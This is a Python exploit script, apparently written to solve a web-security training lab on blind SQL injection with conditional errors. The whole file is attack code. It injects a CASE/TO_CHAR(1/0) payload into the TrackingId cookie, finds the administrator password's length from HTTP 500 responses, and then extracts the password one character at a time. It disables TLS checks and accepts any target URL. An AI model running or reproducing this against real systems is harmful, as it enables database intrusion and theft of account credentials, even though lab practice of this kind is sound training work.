#!/usr/bin/python3

#This is a Python script for Lab: Blind SQL injection with conditional error
#This script does not handle any exceptions.
#You must have your proxy enabled on port 8080.

import requests
import sys
import urllib3
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'127.0.0.1:8080','https':'127.0.0.1:8080'}

def password_length(url):
    print("[I] Calculating the password length...")
    s = requests.Session().get(str(url))
    cookies = s.cookies.get_dict()
    length = 1
    while True:                     
        query = "XURcuoyMVmgmBcqa' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)="+str(length)+") || '"
        pl_cookies = {"TrackingId":query,"session":cookies.get("session")}
        res = requests.get(url,cookies=pl_cookies,verify=False,proxies=proxies)

        if res.status_code == 500:
            print("[+] The administrator's password is %s characters long!" %length)
            print("[I] Bruteforcing the password now.")
            return length     

        length += 1     

def bruteforce(url):
    password = ""
    for i in range(1,password_length(url)+2):
        for j in string.digits + string.ascii_letters:
            query = "XURcuoyMVmgmBcqa' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and SUBSTR(password,"+str(i)+",1)='"+str(j)+"') || '"
            s = requests.Session().get(str(url))
            cookies = s.cookies.get_dict()
            pl_cookies = {"TrackingId":query,"session":cookies.get("session")}
            res = requests.get(url,cookies=pl_cookies,verify=False,proxies=proxies)

            if res.status_code == 500:
                sys.stdout.write("\r[+] Administrator's password: " + password)
                sys.stdout.flush()
                password += j
                break               
            else:
                sys.stdout.write("\r[+] Administrator's password: " + password)
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("[I] Usage: python3 %s <url>" %sys.argv[0])
        print("[I] Example: python3 %s https://example.com/" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    bruteforce(url)
    
if __name__ == "__main__":
    main()
